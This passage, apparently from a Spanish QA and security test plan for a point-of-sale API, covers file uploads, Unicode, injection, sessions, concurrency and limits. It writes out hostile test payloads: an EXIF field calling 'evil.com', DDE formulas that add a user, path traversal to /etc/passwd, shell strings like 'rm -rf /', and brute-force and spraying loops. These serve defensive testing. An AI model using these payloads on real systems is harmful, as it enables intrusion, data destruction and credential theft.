printf '\x89PNG\r\n\x1a\n' > fake_png.png
dd if=/dev/urandom of=fake_png.png bs=1 count=500 seek=8 conv=notrunc

# GIF animado con 1000 frames (puede causar problemas de memoria)
# Imagen CMYK (no RGB) - puede fallar la conversion
# Imagen con perfil ICC corrupto
# Imagen con metadata EXIF maliciosa (campo de 1MB en un tag)
```

**Verificar:**
- [ ] Las imagenes corruptas se detectan y rechazan con error claro
- [ ] No causan crash del proceso backend (no unhandled exception)
- [ ] No dejan archivos temporales en disco
- [ ] Los GIF animados extremos no causan uso excesivo de memoria

### 23.6 Imagenes con Metadata Maliciosa (EXIF)

```bash
# Imagen con EXIF que contiene XSS
exiftool -Comment='<script>alert("xss")</script>' foto.jpg
exiftool -Artist='"; DROP TABLE users;--' foto.jpg
exiftool -ImageDescription='$(curl http://evil.com/steal)' foto.jpg

# Imagen con GPS falso (privacidad)
# Si el sistema muestra metadata EXIF, podria filtrar ubicacion
exiftool -GPSLatitude=19.4326 -GPSLongitude=-99.1332 foto.jpg
```

**Verificar:**
- [ ] La metadata EXIF se stripea antes de guardar (el sistema no debe exponer EXIF a usuarios)
- [ ] Los campos EXIF con payloads XSS no se ejecutan si se muestran
- [ ] Las coordenadas GPS se eliminan para proteger privacidad

### 23.7 Upload Concurrente y Race Conditions

```bash
# 20 uploads simultaneos del mismo archivo
for i in $(seq 1 20); do
  curl -X POST http://localhost:8000/api/v1/mermas/photo \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@foto.jpg" &
done
wait

# Upload del mismo nombre de archivo dos veces seguidas
curl -X POST ... -F "file=@foto.jpg"
curl -X POST ... -F "file=@foto.jpg"  # Mismo nombre, sobreescribe o crea copia?
```

**Verificar:**
- [ ] Los 20 uploads se procesan sin errores
- [ ] No hay archivos con nombres duplicados o colisiones
- [ ] El servidor no se bloquea con uploads concurrentes
- [ ] Cada archivo tiene un nombre unico en el storage

### 23.8 Upload con Conexion Interrumpida

- [ ] Subir archivo de 5MB y cancelar a la mitad — el archivo parcial se limpia?
- [ ] Subir archivo, perder conexion de red a la mitad — el backend hace cleanup?
- [ ] Cerrar el navegador/Electron durante upload — no queda archivo huerfano en disco?
- [ ] Upload timeout (archivo grande + conexion lenta) — error claro al usuario?

### 23.9 Importacion de Datos (CSV/Excel)

Si el sistema tiene funcionalidad de importar datos:

**Archivos CSV adversarios:**

```csv
# CSV con inyeccion de formulas (DDE attack)
Nombre,Precio,SKU
=CMD|'/C calc'!A1,100,SKU001
@SUM(1+1)*cmd|'/C calc'!A0,200,SKU002
+cmd|'/C notepad'!A0,300,SKU003
-cmd|'/C net user hacker P@ss/add'!A0,400,SKU004

# CSV con caracteres especiales
"Producto con ""comillas"" internas",100,SKU005
"Producto con
salto de linea",200,SKU006
Producto con,coma,en,nombre,300,SKU007

# CSV con BOM (Byte Order Mark)
# echo -ne '\xef\xbb\xbfNombre,Precio\n' > bom.csv

# CSV con encoding incorrecto (Latin-1 vs UTF-8)
# Producto: "Camisón de algodón" en Latin-1

# CSV vacio (solo headers)
Nombre,Precio,SKU

# CSV sin headers
Coca Cola,15.00,SKU001

# CSV con 100,000 filas
# for i in $(seq 1 100000); do echo "Producto $i,$i.99,SKU$i"; done > mega.csv

# CSV con columnas extra no esperadas
Nombre,Precio,SKU,Columna_Extra,Otra_Mas
Producto,100,SKU001,dato1,dato2

# CSV con columnas faltantes
Nombre
Solo nombre sin precio ni SKU
```

**Verificar:**
- [ ] Las formulas DDE (=CMD, @SUM, +cmd, -cmd) se tratan como texto plano
- [ ] Los saltos de linea dentro de campos entre comillas se manejan correctamente
- [ ] El BOM UTF-8 no corrompe el primer campo
- [ ] Los encodings incorrectos se detectan o se manejan graciosamente
- [ ] CSV vacio no causa error 500
- [ ] CSV sin headers se detecta y se rechaza o maneja
- [ ] CSV de 100K filas no causa timeout ni out-of-memory
- [ ] Las columnas extra se ignoran, las faltantes causan error descriptivo

### 23.10 Archivos con Nombres Peligrosos

```bash
# Nombres de archivo que intentan path traversal
curl -F "file=@foto.jpg;filename=../../etc/passwd"
curl -F "file=@foto.jpg;filename=../../../app/config.py"
curl -F "file=@foto.jpg;filename=..%2F..%2Fetc%2Fpasswd"

# Nombres con caracteres especiales
curl -F "file=@foto.jpg;filename=foto con espacios.jpg"
curl -F "file=@foto.jpg;filename=foto<script>alert(1)</script>.jpg"
curl -F "file=@foto.jpg;filename=foto; rm -rf /.jpg"
curl -F "file=@foto.jpg;filename=foto|ls.jpg"
curl -F "file=@foto.jpg;filename=foto\x00.php.jpg"  # null byte
curl -F "file=@foto.jpg;filename=.htaccess"
curl -F "file=@foto.jpg;filename=web.config"
curl -F "file=@foto.jpg;filename=.env"
curl -F "file=@foto.jpg;filename=CON.jpg"  # nombre reservado Windows
curl -F "file=@foto.jpg;filename=NUL.jpg"  # nombre reservado Windows
curl -F "file=@foto.jpg;filename=PRN.jpg"  # nombre reservado Windows

# Nombre vacio
curl -F "file=@foto.jpg;filename="

# Nombre muy largo (500 caracteres)
curl -F "file=@foto.jpg;filename=$(python3 -c "print('A'*500 + '.jpg')")"

# Nombre con solo extension
curl -F "file=@foto.jpg;filename=.jpg"

# Nombre con doble extension
curl -F "file=@foto.jpg;filename=foto.php.jpg"
curl -F "file=@foto.jpg;filename=foto.jpg.exe"
curl -F "file=@foto.jpg;filename=foto.jsp.png"
```

**Verificar:**
- [ ] Path traversal (../) se rechaza o sanitiza
- [ ] Caracteres especiales en nombres se sanitizan
- [ ] Null bytes se eliminan
- [ ] Nombres reservados de Windows no causan problemas
- [ ] El archivo se guarda con un nombre generado (UUID/hash), no con el nombre original
- [ ] Doble extension no permite ejecucion de codigo

---

## 24. Pruebas Exhaustivas de Emojis y Unicode

Esta seccion prueba el manejo de emojis y caracteres Unicode en TODOS los campos de texto del sistema. Muchas bases de datos y aplicaciones fallan con emojis porque requieren UTF-8 de 4 bytes (utf8mb4 en MySQL, o UTF-8 correcto en PostgreSQL).

### 24.1 Banco de Pruebas de Emojis

Usar los siguientes strings de prueba en CADA campo de texto del sistema:

**Emojis basicos (BMP - 2 bytes UTF-16):**
```
✓ ✗ ★ ♠ ♣ ♥ ♦ ☀ ☁ ☂ ☎ ☑ ☒ ✉ ✈ ✂ ♻ ⚡ ⚠ ⚙
```

**Emojis comunes (Supplementary Plane - 4 bytes UTF-8):**
```
😀 😁 😂 🤣 😃 😄 😅 😆 😉 😊 😋 😎 😍 😘 🥰 😗 😙 🥲 😚
🔥 💰 🎉 ✅ ❌ 📱 🛒 🏪 💳 🧾 📊 📈 📉 🔔 🔕 🗑️ ✏️ 📋 📌
```

**Emojis compuestos (secuencias ZWJ - multiples code points):**
```
👨‍👩‍👧‍👦 (familia)
👨‍💻 (hombre programador)
🏳️‍🌈 (bandera arcoiris)
🧑‍🍳 (chef)
👩‍🔬 (cientifica)
🧑‍🚀 (astronauta)
```

**Emojis con modificador de tono de piel:**
```
👍🏻 👍🏼 👍🏽 👍🏾 👍🏿
🙋🏻‍♀️ 🙋🏽‍♂️
```

**Banderas (secuencias Regional Indicator):**
```
🇲🇽 🇺🇸 🇧🇷 🇦🇷 🇨🇴 🇨🇱 🇵🇪 🇪🇨 🇬🇹 🇪🇸
```

**Emojis nuevos (Unicode 15+):**
```
🫠 🫡 🫣 🫤 🫥 🫦 🫧 🫰 🫱 🫲 🪷 🪻 🫚 🫛
```

### 24.2 Campos Donde Probar Emojis

**TODOS los siguientes campos deben probarse individualmente con emojis:**

#### Modulo Productos (F3):
- [ ] Nombre del producto: "Coca Cola 🥤"
- [ ] Descripcion del producto: "Refresco bien frio 🧊❄️"
- [ ] SKU: "SKU-🔥-001" (debe rechazarse? o aceptarse?)
- [ ] Codigo de barras: "🔢123456789"
- [ ] Categoria: "Bebidas 🍺"
- [ ] Notas del producto: "Solo en temporada 🎄🎅"
- [ ] Unidad de medida: "📦 caja"

#### Modulo Clientes (F2):
- [ ] Nombre: "Maria 🌹"
- [ ] Apellido: "Lopez 👑"
- [ ] Telefono: "📱 999-123-4567"
- [ ] Email: "emoji@test.com 📧"
- [ ] Direccion: "Calle 60 #500 🏠"
- [ ] RFC: "XAXX010101000 🧾" (debe rechazarse)
- [ ] Notas del cliente: "Cliente preferente 🌟⭐"

#### Modulo Ventas (F1):
- [ ] Notas de la venta: "Entrega especial 🚚"
- [ ] Busqueda de producto por nombre con emojis
- [ ] Campo de descuento: "$💰100"

#### Modulo Inventario (F4):
- [ ] Razon de ajuste: "Merma por 🌧️ lluvia"
- [ ] Notas de movimiento: "Transferencia 🔄"

#### Modulo Turnos (F5):
- [ ] Notas de apertura: "Turno matutino ☀️"
- [ ] Notas de cierre: "Todo bien ✅"
- [ ] Observaciones: "Faltante de 💰 en caja"

#### Modulo Gastos (F11):
- [ ] Descripcion del gasto: "Compra de 🧹 escobas"
- [ ] Concepto: "Limpieza 🧼✨"
- [ ] Beneficiario: "🏪 Tienda de limpieza"

#### Modulo Ajustes (F8):
- [ ] Nombre del negocio: "🏪 Novedades Lupita"
- [ ] Direccion: "Merida 🌴"
- [ ] Nombre de sucursal: "Sucursal Centro 🏢"
- [ ] Pie de ticket: "Gracias por su compra! 🙏😊"

#### Modulo Mermas (F10):
- [ ] Razon de merma: "Producto 🫠 derretido"
- [ ] Notas de aprobacion: "Aprobado ✅ por gerente"
- [ ] Notas de rechazo: "Rechazado ❌ - revisar"

#### Login:
- [ ] Username con emojis: "admin😎" (debe rechazarse?)
- [ ] Password con emojis: "P@ss🔒word123" (debe funcionar!)

### 24.3 Verificaciones por Campo

**Para CADA campo probado con emojis, verificar:**

- [ ] **Se guarda correctamente** — el emoji no se convierte en "?" o "???" o "&#xFFFD;" o rectangulos vacios
- [ ] **Se muestra correctamente** — al releer/editar, el emoji aparece igual
- [ ] **No corrompe el campo** — el texto alrededor del emoji sigue intacto
- [ ] **No rompe el layout** — los emojis no causan desbordamiento visual
- [ ] **No rompe el ticket** — si el campo aparece en ticket impreso, no sale basura
- [ ] **Se busca correctamente** — buscar por "Coca Cola 🥤" encuentra el producto
- [ ] **La longitud se calcula bien** — un emoji de familia (👨‍👩‍👧‍👦) tiene 25 bytes pero es 1 "caracter visual"; si el limite es 50 caracteres, funciona?
- [ ] **No causa error en la API** — el JSON se codifica/decodifica correctamente
- [ ] **No causa error en la BD** — PostgreSQL con UTF-8 deberia manejar emojis nativamente
- [ ] **Los reportes se generan** — los emojis no rompen exports a PDF/CSV/Excel

### 24.4 Caracteres Unicode Problematicos

Estos caracteres son conocidos por romper sistemas. Probar en campos de texto:

**Caracteres de ancho cero (invisibles):**
```
Texto​normal  (zero-width space U+200B entre "Texto" y "normal")
Texto‌normal  (zero-width non-joiner U+200C)
Texto‍normal  (zero-width joiner U+200D)
Texto﻿normal  (BOM U+FEFF en medio del texto)
Texto⁠normal  (word joiner U+2060)
```

- [ ] Estos caracteres invisibles no causan problemas de busqueda (buscar "Textonormal" debe encontrar ambas versiones?)
- [ ] No crean duplicados aparentes (dos productos que "se ven igual" pero uno tiene un caracter invisible)
- [ ] La longitud del campo es correcta (no cuenta los invisibles como 0 ni como multiples)

**Caracteres Zalgo (texto "maldito"):**
```
Z̴̧̛̺̲̣̻̳̼̪̖̿̽̈́̌̓ a̸̧̛̺̲l̸̨̛̺g̸̛̺ơ̸̺ t̸̛̺e̸̛̺x̸̛̺t̸̛̺
T̵̡̧̨̗̻̙̪̘̹̦̤̩̯̮̤̖̰͙̗̦̟̬̙̘͕̫̹̦̩̋̎̈́̈́̓̅̋̈̋̓̿͛͐̎̅̅̃͒̂̐͛̂̑̿̔̈́̐̕͘̕̕̕̕͜͠ͅe̷̡̡̛̝̦x̴̨̢t̸o̷
```

- [ ] El Zalgo text no se desborda del campo visualmente (puede ser MUY alto)
- [ ] Se guarda y recupera correctamente
- [ ] No rompe el layout de tablas o listados
- [ ] El ticket/impresion no se rompe

**Caracteres bidireccionales (RTL - derecha a izquierda):**
```
Normal text مرحبا mixed content
Normal text שלום mixed content
A‮B‬CD (U+202E - Right-to-Left Override: puede hacer que el texto se vea al reves)
```

- [ ] Los caracteres RTL no "invierten" el texto circundante de forma confusa
- [ ] No se puede usar RTL override para ocultar contenido en campos (por ejemplo, un SKU que parece "SKU001" pero realmente es "100UKS")
- [ ] Los montos de dinero no se muestran al reves ($100.00 no debe verse como 00.001$)

**Caracteres de control:**
```
Texto\x00oculto   (null byte - puede truncar strings en C/C++)
Texto\x08retro    (backspace)
Texto\x1B[31mROJO\x1B[0m  (ANSI escape - colorea terminal)
Texto\x0Dnueva    (carriage return - puede sobreescribir linea en terminal)
Texto\x07beep     (bell - puede hacer sonido en terminal)
```

- [ ] Los null bytes se stripean o rechazan, nunca truncan el texto silenciosamente
- [ ] Los ANSI escape codes no se interpretan (no cambian colores en logs o UI)
- [ ] Los caracteres de control se sanitizan al guardar

**Caracteres de confusion visual (homoglyphs):**
```
admin vs аdmin (primera 'a' es latina, segunda es cirrilica U+0430)
pаypal.com vs paypal.com (la 'a' es cirrilica)
SKU001 vs SKU0Ⅹ1 (la 'O' es el numero romano Ⅹ U+2169)
ᏚᏦᏌ001 vs SKU001 (letras Cherokee que se ven similares)
```

- [ ] El sistema no permite crear dos usuarios o productos "identicos visualmente" pero diferentes en bytes
- [ ] La busqueda por nombre maneja correctamente los homoglyphs
- [ ] Los SKU no se pueden "falsificar" con caracteres similares

### 24.5 Strings de Prueba Famosos ("Naughty Strings")

Probar estos strings clasicos (del proyecto "Big List of Naughty Strings") en todos los campos:

```
# Strings vacios y espaciales
""
" "
"     " (solo espacios)
"\t\t\t" (solo tabs)
"\n\n\n" (solo newlines)
"\r\n\r\n" (Windows newlines)

# SQL injection con Unicode
＇ OR ＇1＇＝＇1 (comillas fullwidth)
ʼ OR ʼ1ʼ=ʼ1 (modifier letter apostrophe)

# Null y undefined como texto
"null"
"NULL"
"nil"
"None"
"undefined"
"NaN"
"Infinity"
"-Infinity"
"true"
"false"
"0"
"-1"
"1e308" (mayor que float max)
"1e-308" (menor que float min)

# Strings que parecen numeros
"0.0"
"-0"
"00"
"001"
"0x1F" (hex)
"0b1010" (binary)
"0o17" (octal)

# Strings con formato
"$100.00" en un campo de texto (no de precio)
"50%" en un campo de texto
"2026-02-25" en un campo que no es de fecha
"12:00:00" en un campo que no es de hora
"info@test.com" en un campo que no es de email

# Template strings / interpolacion
"${user.password}"
"{{user.password}}"
"<%= user.password %>"
"#{user.password}"
"${{user.password}}" (GitHub Actions injection)

# Comandos shell
"; cat /etc/passwd"
"| ls -la"
"$(whoami)"
"`whoami`"
"&& rm -rf /"

# JSON dentro de un campo
'{"key": "value"}'
'[1, 2, 3]'

# XML/HTML entities
"&amp; &lt; &gt; &quot; &#39;"
"<![CDATA[test]]>"
```

**Verificar para cada naughty string:**
- [ ] Se guarda tal cual (como texto literal)
- [ ] No se interpreta como codigo, SQL, shell, JSON ni template
- [ ] No causa error 500 en el backend
- [ ] Al recuperarlo, es byte-por-byte identico a lo que se envio
- [ ] No corrompe otros campos o registros

### 24.6 Longitud de Strings con Unicode

El largo de un string Unicode no es trivial. Probar estos escenarios:

| String | bytes UTF-8 | code points | grapheme clusters (visual) |
|---|---|---|---|
| "ABC" | 3 | 3 | 3 |
| "ñ" | 2 | 1 | 1 |
| "é" (precomposed) | 2 | 1 | 1 |
| "é" (decomposed: e + ´) | 3 | 2 | 1 |
| "🔥" | 4 | 1 | 1 |
| "👨‍👩‍👧‍👦" | 25 | 7 | 1 |
| "🏳️‍🌈" | 14 | 4 | 1 |
| "🇲🇽" | 8 | 2 | 1 |

**Preguntas criticas:**
- [ ] Si el limite de nombre de producto es 200 caracteres, que unidad se usa? (bytes, code points, graphemes)
- [ ] Un nombre de 50 emojis de familia (👨‍👩‍👧‍👦) son 50 "caracteres" visuales pero 1,250 bytes — cabe?
- [ ] La UI muestra correctamente el contador de caracteres restantes?
- [ ] La BD acepta el string sin truncar? (VARCHAR(200) en bytes vs caracteres depende del encoding)
- [ ] Al truncar por limite, no se parte un emoji a la mitad (causando caracteres corruptos)?

### 24.7 Emojis en Impresion (Tickets)

Si el sistema tiene impresion de tickets (termica o PDF):

- [ ] Los emojis en nombre de producto se imprimen como cuadros vacios, se omiten, o se imprimen bien?
- [ ] Si la impresora termica no soporta emojis, el ticket no se corrompe (no sale basura)
- [ ] El ancho del ticket no se desborda por emojis de ancho variable
- [ ] Los emojis en el pie de ticket ("Gracias! 🙏") se manejan correctamente
- [ ] Si se genera PDF del ticket, los emojis se renderizan con una fuente que los soporte

### 24.8 Emojis en Exportaciones

- [ ] Exportar a CSV productos con emojis en nombre — se abre correctamente en Excel?
- [ ] El CSV tiene BOM UTF-8 (para que Excel lo interprete bien)?
- [ ] Exportar a Excel (.xlsx) — los emojis se ven en las celdas?
- [ ] Exportar a PDF — la fuente del PDF incluye glyphs para emojis?
- [ ] Copiar datos de la tabla al portapapeles — los emojis se preservan?

---

## 25. Pruebas de Inyeccion en Campos Numericos

### 25.1 Campos de Precio

Probar los siguientes valores en todos los campos que aceptan precios:

```
# Numeros normales (referencia)
0
0.01
99.99
1000.00
99999.99

# Numeros negativos
-1
-0.01
-99999

# Notacion cientifica
1e5
1E5
1e-5
1e308 (overflow)
1e-308 (underflow)
Infinity
-Infinity
NaN

# No numeros
abc
$100
100.00$
"100"
100,00 (coma como separador decimal - Mexico usa punto)
1,000.00 (coma como separador de miles)
1.000,00 (formato europeo)

# Numeros extremos
0.001 (tres decimales)
0.0001 (cuatro decimales)
99999999999999.99 (14 digitos)
999999999999999999999999 (overflow)
0.00000000001

# Caracteres especiales
100.00<script>alert(1)</script>
100.00'; DROP TABLE products;--
100.00\n200.00 (salto de linea)

# Unicode numeros
١٢٣ (numeros arabigos orientales)
१२३ (numeros devanagari)
㊀㊁㊂ (numeros CJK)
Ⅰ Ⅱ Ⅲ (numeros romanos Unicode)
```

**Verificar:**
- [ ] Solo se aceptan numeros validos positivos con maximo 2 decimales
- [ ] Negativos se rechazan con error claro
- [ ] Notacion cientifica se rechaza o convierte correctamente
- [ ] NaN/Infinity se rechazan
- [ ] No hay SQL injection ni XSS via campos numericos
- [ ] Los valores extremos no causan overflow en la BD
- [ ] Los separadores decimales se manejan consistentemente (punto)

### 25.2 Campos de Cantidad

```
0
-1
0.5 (para productos a granel)
0.001
999999
1e10
NaN
Infinity
"diez"
10.5.3 (doble punto decimal)
10,5
```

### 25.3 Campos de Porcentaje (Descuentos)

```
0
-5 (descuento negativo = recargo?)
100 (descuento total)
101 (descuento mayor al 100%)
999
50.5
0.01
NaN
```

---

## 26. Pruebas de Sesion y Autenticacion Avanzadas

### 26.1 Manipulacion de Sesion

- [ ] Copiar el token de una sesion y usarlo en otra maquina/navegador — funciona? (JWT es stateless, si deberia)
- [ ] Expirar el token manualmente (esperar o modificar reloj) — la app redirige a login?
- [ ] Usar un token de un usuario eliminado/desactivado — retorna 401?
- [ ] Modificar el localStorage/sessionStorage directamente para cambiar el user_id o role — la app lo detecta?
- [ ] Borrar el token de localStorage y navegar a una ruta protegida — redirige a login?
- [ ] Tener dos pestanas abiertas, hacer logout en una — la otra detecta el logout?
- [ ] Hacer login con usuario A, abrir nueva pestana y hacer login con usuario B — que pasa en la primera pestana?

### 26.2 Sesiones Multiples

- [ ] El mismo usuario puede tener 10 sesiones activas simultaneas?
- [ ] Si hay limite de sesiones, la mas vieja se invalida al crear una nueva?
- [ ] Cambiar la contraseña invalida todas las sesiones activas?
- [ ] Desactivar un usuario invalida todas sus sesiones inmediatamente?

### 26.3 Fuerza Bruta Distribuida

```bash
# Simulacion de ataque distribuido desde multiples "IPs"
# Usar diferentes headers X-Forwarded-For para evadir rate limiting por IP

for IP in 10.0.0.{1..50}; do
  for PASS in password1 password2 password3 admin123 qwerty; do
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST http://localhost:8000/api/v1/auth/login \
      -H "Content-Type: application/json" \
      -H "X-Forwarded-For: $IP" \
      -d "{\"username\": \"admin\", \"password\": \"$PASS\"}" &
  done
done
wait
```

- [ ] El rate limiting no se basa SOLO en IP (deberia tambien limitar por username)
- [ ] Despues de X intentos fallidos, la cuenta se bloquea temporalmente?
- [ ] Se genera alerta/log cuando hay multiples intentos fallidos?

### 26.4 Password Spraying

```bash
# Intentar 1 password comun contra muchos usuarios
for USER in admin gerente cajero1 cajero2 supervisor; do
  curl -s -o /dev/null -w "$USER: %{http_code}\n" \
    -X POST http://localhost:8000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"$USER\", \"password\": \"123456\"}"
done
```

- [ ] No se revelan usuarios validos vs invalidos (timing attack)
- [ ] Los intentos fallidos se registran todos en logs
- [ ] El tiempo de respuesta es el mismo para usuario existente vs inexistente

---

## 27. Pruebas de API Directa (Bypass de Frontend)

Probar la API directamente con curl/Postman para saltear la validacion del frontend:

### 27.1 Payloads JSON Malformados

```bash
# JSON invalido
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d 'esto no es json'

# JSON con tipos incorrectos
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": 12345, "price": "no es numero", "sku": true}'

# JSON con campos extra inesperados
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Producto", "price": 100, "is_admin": true, "role": "admin"}'

# JSON con campos anidados muy profundos
# {"a": {"b": {"c": {"d": ... 100 niveles ... }}}}
python3 -c "
import json
d = {'val': 'deep'}
for i in range(100): d = {'nested': d}
print(json.dumps(d))
" | curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d @-

# JSON muy grande (10MB de datos)
python3 -c "
import json
print(json.dumps({'name': 'A' * 10_000_000, 'price': 100}))
" | curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d @-

# Content-Type incorrecto
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: text/xml" \
  -H "Authorization: Bearer $TOKEN" \
  -d '<product><name>Test</name></product>'

# JSON con duplicados de clave
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "Bueno", "name": "Malo", "price": 100}'

# Encoding UTF-16 en lugar de UTF-8
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json; charset=utf-16" \
  -H "Authorization: Bearer $TOKEN" \
  --data-binary @<(echo '{"name": "test", "price": 100}' | iconv -t UTF-16)
```

**Verificar:**
- [ ] Todos retornan 400 o 422 con mensaje descriptivo, nunca 500
- [ ] Los campos extra se ignoran (no se guardan en BD)
- [ ] Los tipos incorrectos se rechazan antes de tocar la BD
- [ ] JSON enorme no causa out-of-memory
- [ ] JSON anidado profundo no causa stack overflow

### 27.2 IDs Manipulados

```bash
# ID de otro tenant (aislamiento multi-tenant)
curl http://localhost:8000/api/v1/products/UUID_DE_OTRO_TENANT \
  -H "Authorization: Bearer $TOKEN_TENANT_A"
# DEBE retornar 404 (no 403, para no revelar existencia)

# ID invalido
curl http://localhost:8000/api/v1/products/no-es-un-uuid \
  -H "Authorization: Bearer $TOKEN"

# ID con inyeccion
curl "http://localhost:8000/api/v1/products/1 OR 1=1" \
  -H "Authorization: Bearer $TOKEN"

# ID negativo
curl http://localhost:8000/api/v1/products/-1 \
  -H "Authorization: Bearer $TOKEN"

# ID = 0
curl http://localhost:8000/api/v1/products/0 \
  -H "Authorization: Bearer $TOKEN"

# ID muy largo
curl http://localhost:8000/api/v1/products/$(python3 -c "print('a'*10000)") \
  -H "Authorization: Bearer $TOKEN"

# UUID valido pero inexistente
curl http://localhost:8000/api/v1/products/00000000-0000-0000-0000-000000000000 \
  -H "Authorization: Bearer $TOKEN"
```

### 27.3 Query Parameters Manipulados

```bash
# Paginacion negativa
curl "http://localhost:8000/api/v1/products/?page=-1&limit=-10" \
  -H "Authorization: Bearer $TOKEN"

# Paginacion extrema
curl "http://localhost:8000/api/v1/products/?page=999999&limit=999999" \
  -H "Authorization: Bearer $TOKEN"

# Limit = 0
curl "http://localhost:8000/api/v1/products/?limit=0" \
  -H "Authorization: Bearer $TOKEN"

# Parametros inesperados
curl "http://localhost:8000/api/v1/products/?admin=true&debug=1&verbose=yes" \
  -H "Authorization: Bearer $TOKEN"

# Parametros duplicados
curl "http://localhost:8000/api/v1/products/?search=coca&search=pepsi" \
  -H "Authorization: Bearer $TOKEN"

# Parametros con SQL injection
curl "http://localhost:8000/api/v1/products/?sort=name; DROP TABLE products;--" \
  -H "Authorization: Bearer $TOKEN"

# Parametros con path traversal
curl "http://localhost:8000/api/v1/products/?export=../../etc/passwd" \
  -H "Authorization: Bearer $TOKEN"
```

### 27.4 HTTP Methods No Esperados

```bash
# PATCH en endpoint que solo acepta PUT
curl -X PATCH http://localhost:8000/api/v1/products/UUID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "Nuevo"}'

# DELETE en endpoint de listado
curl -X DELETE http://localhost:8000/api/v1/products/ \
  -H "Authorization: Bearer $TOKEN"

# PUT en endpoint de creacion
curl -X PUT http://localhost:8000/api/v1/products/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test", "price": 100}'

# OPTIONS (preflight CORS)
curl -X OPTIONS http://localhost:8000/api/v1/products/ \
  -H "Origin: http://evil.com"

# TRACE (puede exponer headers)
curl -X TRACE http://localhost:8000/api/v1/products/ \
  -H "Authorization: Bearer $TOKEN"

# Metodo inventado
curl -X HACK http://localhost:8000/api/v1/products/ \
  -H "Authorization: Bearer $TOKEN"
```

**Verificar:**
- [ ] Todos retornan 405 Method Not Allowed
- [ ] TRACE esta deshabilitado (no refleja headers)
- [ ] OPTIONS retorna los metodos permitidos correctamente

---

## 28. Pruebas de Concurrencia y Race Conditions

### 28.1 Doble Clic / Doble Submit

```bash
# Enviar la misma venta 2 veces en < 100ms
curl -X POST http://localhost:8000/api/v1/sales/ ... &
curl -X POST http://localhost:8000/api/v1/sales/ ... &
wait
```

- [ ] No se crean 2 ventas identicas
- [ ] El stock se descuenta una sola vez
- [ ] El folio no se duplica
- [ ] La respuesta de la segunda peticion indica que ya se proceso

### 28.2 Actualizacion Concurrente del Mismo Producto

```bash
# Dos gerentes editan el mismo producto al mismo tiempo
# Gerente A cambia nombre a "Coca Cola 600ml"
# Gerente B cambia precio a $18.00
# Si ambos envian al mismo tiempo, que gana?
curl -X PUT http://localhost:8000/api/v1/products/UUID \
  -H "Authorization: Bearer $TOKEN_A" \
  -d '{"name": "Coca Cola 600ml"}' &
curl -X PUT http://localhost:8000/api/v1/products/UUID \
  -H "Authorization: Bearer $TOKEN_B" \
  -d '{"price": 18.00}' &
wait
```

- [ ] No se pierde ninguno de los dos cambios (o se aplica el ultimo con advertencia)
- [ ] No hay corrupcion de datos
- [ ] La respuesta incluye la version final del producto

### 28.3 Venta Concurrente del Ultimo Producto en Stock

```bash
# Producto tiene stock = 1
# Dos cajeros intentan venderlo al mismo tiempo
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Authorization: Bearer $TOKEN_CAJERO_1" \
  -d '{"items": [{"product_id": UUID, "quantity": 1}]}' &
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Authorization: Bearer $TOKEN_CAJERO_2" \
  -d '{"items": [{"product_id": UUID, "quantity": 1}]}' &
wait
```

- [ ] Solo una venta se completa exitosamente
- [ ] La otra retorna error "Stock insuficiente"
- [ ] El stock final es exactamente 0 (no -1)
- [ ] Ambos cajeros reciben respuesta clara

### 28.4 Apertura Concurrente de Turno

- [ ] Dos personas intentan abrir turno al mismo tiempo — solo uno debe poder abrirlo
- [ ] El que falla recibe error "Ya existe un turno abierto"

---

## 29. Pruebas de Limites del Sistema

### 29.1 Limites de Base de Datos

- [ ] Crear 100,000 productos — la busqueda sigue siendo rapida (<1s)?
- [ ] Crear 50,000 clientes — el listado pagina correctamente?
- [ ] Tener 1,000,000 de ventas — los reportes se generan en tiempo razonable?
- [ ] Tener 500 categorias — el selector de categorias no se cuelga?

### 29.2 Limites de Memoria

- [ ] Generar reporte de ventas de 1 ano con 1M de registros — el backend no se queda sin RAM?
- [ ] Buscar producto con wildcard amplio — no se trae toda la tabla a memoria?
- [ ] Listado con per_page=10000 — el servidor maneja la paginacion excesiva?

### 29.3 Limites de Disco

- [ ] Si las fotos de merma se acumulan — se limpian automaticamente?
- [ ] Los logs crecen sin control?
- [ ] Los backups se rotan (no acumulan indefinidamente)?

### 29.4 Limites de Tiempo

- [ ] Reporte mensual con millones de registros — timeout configurable?
- [ ] Query compleja (join de 5 tablas) — se ejecuta en <5s?
- [ ] Sincronizacion de 50,000 productos — no timeout?

---

## 30. Pruebas de Degradacion Graceful

### 30.1 Servicios Externos Caidos

- [ ] Si la impresora no esta conectada — el sistema lo detecta y muestra error (no se cuelga)
- [ ] Si el servicio de sincronizacion esta caido — se puede seguir vendiendo offline?
- [ ] Si Redis esta caido — las funcionalidades core siguen funcionando?

### 30.2 Recursos Agotados

- [ ] Con CPU al 100% — las ventas se siguen procesando (quizas lento, pero no se pierden)?
- [ ] Con RAM al 95% — el sistema no crashea (quizas rechaza requests nuevos con 503)?
- [ ] Con disco al 99% — se notifica al usuario y no se corrompen datos?

### 30.3 Errores Parciales

- [ ] Si la venta se guarda pero el movimiento de inventario falla — se hace rollback completo?
- [ ] Si la actualizacion de credito falla despues de registrar la venta a credito — es consistente?
